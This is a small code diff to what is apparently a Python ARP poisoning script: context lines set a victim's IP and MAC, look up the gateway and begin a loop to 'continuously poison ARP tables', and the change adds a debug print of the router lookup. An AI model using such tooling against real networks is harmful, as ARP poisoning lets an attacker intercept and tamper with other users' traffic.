@@ -15,6 +15,7 @@ def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac):
 victim_ip = "192.168.1.5"  # Victim's IP
 victim_mac = "00:11:22:33:44:55"  # Victim's MAC address
 gateway_ip, gateway_mac = router_ip_mac.get_router_ip_mac()
+print(router_ip_mac.get_router_ip_mac())
 
 # Continuously poison ARP tables
 try:
